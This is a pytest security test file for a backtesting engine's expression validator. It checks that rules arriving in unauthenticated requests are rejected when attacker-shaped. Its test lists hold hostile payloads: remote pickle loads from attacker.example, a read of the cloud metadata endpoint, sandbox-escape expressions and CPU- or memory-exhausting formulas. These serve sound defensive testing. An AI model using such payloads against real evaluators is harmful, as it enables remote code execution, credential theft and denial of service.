"""Security tests: the eval surface must reject attacker-shaped expressions.

Rules and custom formulas arrive from unauthenticated POST /backtest bodies,
so the validator is fail-closed: AST allowlist on top of the token denylist,
and no pandas/numpy modules in the eval environment.
"""

import pandas as pd
import pytest

from backtest.rule_based_engine import (
    _evaluate_custom_formula,
    _evaluate_rule_series,
    validate_formula_syntax,
    validate_rule_syntax,
)


def _frame():
    idx = pd.date_range("2024-01-01", periods=30, freq="B")
    close = pd.Series(range(100, 130), index=idx, dtype=float)
    return pd.DataFrame({
        "datetime": idx,
        "open": close - 0.5,
        "high": close + 1,
        "low": close - 1,
        "close": close,
        "volume": 1_000_000,
    })


MALICIOUS_RULES = [
    "pd.read_pickle('http://attacker.example/p.pkl')",
    "np.load('http://attacker.example/x.npy')",
    "pd.read_csv('http://169.254.169.254/latest/meta-data/')",
    "close.__class__",
    "(lambda: 1)()",
    "[x for x in (1,)][0] > 0",
    "close if True else open",
    "getattr(close, 'to_pickle')",
    "{'a': 1}['a'] > 0",
]

# Computational-DoS payloads: no RCE, but they pin a core / exhaust memory on a
# single unauthenticated request (P0-3 reopened /backtest to anonymous callers).
DOS_RULES = [
    "9 ** 9 ** 9 > 0",              # ~369M-digit int, minutes of CPU
    "3 ** 20000000 > 0",            # ~20M-bit int, seconds + MB
    '("a" * 999999999) > ""',       # gigabyte string allocation
    "close ** 999999 > 0",          # exponent on a series
    "99999999999999 > 0",           # constant past the magnitude bound
]


@pytest.mark.parametrize("rule", MALICIOUS_RULES + DOS_RULES)
def test_malicious_rules_rejected(rule):
    with pytest.raises(ValueError):
        _evaluate_rule_series(rule, _frame())
    assert validate_rule_syntax(rule) is not None


@pytest.mark.parametrize("formula", DOS_RULES)
def test_dos_formulas_rejected(formula):
    with pytest.raises(ValueError):
        _evaluate_custom_formula(formula, _frame())
    assert validate_formula_syntax(formula) is not None


@pytest.mark.parametrize("formula", [
    "pd.read_pickle('http://attacker.example/p.pkl')",
    "close.to_csv('http://x')",
    "np.frombuffer(b'x')",
])
def test_malicious_formulas_rejected(formula):
    with pytest.raises(ValueError):
        _evaluate_custom_formula(formula, _frame())
    assert validate_formula_syntax(formula) is not None


BENIGN_RULES = [
    "close > sma(close, 5)",
    "(close > lag(close, 3)) & (volume > 0)",
    "close[5] < close",                    # bracket sugar -> lag()
    "abs(close - open) > 0.1",
    "~(close < open) | (high > low)",
    "rsi(close, 14) > 50",
    "pct_change(close, 5) > 0.03",
    "crosses_above(close, sma(close, 10))",
]


@pytest.mark.parametrize("rule", BENIGN_RULES)
def test_benign_rules_still_evaluate(rule):
    result = _evaluate_rule_series(rule, _frame())
    assert result.dtype == bool
    assert validate_rule_syntax(rule) is None


def test_benign_formulas_still_evaluate():
    frame = _frame()
    out = _evaluate_custom_formula("close / close[5]", frame)
    assert len(out) == len(frame)
    out2 = _evaluate_custom_formula("(high[0:5] - low[0:5]).mean()", frame)
    assert len(out2) == len(frame)
    assert validate_formula_syntax("close / close[5]") is None


def test_position_side_string_compare_still_works():
    # exit rules compare position_side to string constants
    assert validate_rule_syntax("(position_side == 'LONG') & (close > 0)") is None
